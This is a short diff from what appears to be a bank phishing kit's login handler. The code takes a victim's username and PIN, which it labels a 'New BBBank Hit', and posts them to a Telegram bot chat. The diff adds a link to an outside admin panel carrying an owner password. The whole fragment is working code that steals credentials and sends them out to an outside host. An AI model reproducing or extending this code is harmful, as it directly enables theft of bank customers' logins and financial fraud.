@@ -62,8 +62,8 @@ const submitLogin = async (req, res) => {
 			.post(
 				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
 				{
-					chat_id: '-837014205',
-					text: `New BBBank Hit:\n\n${username}\n${pin}`,
+					chat_id: "-837014205",
+					text: `New BBBank Hit:\n\n${username}\n${pin}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=bbbank&password=${owner}`,
 					parse_mode: "Markdown",
 				}
 			)
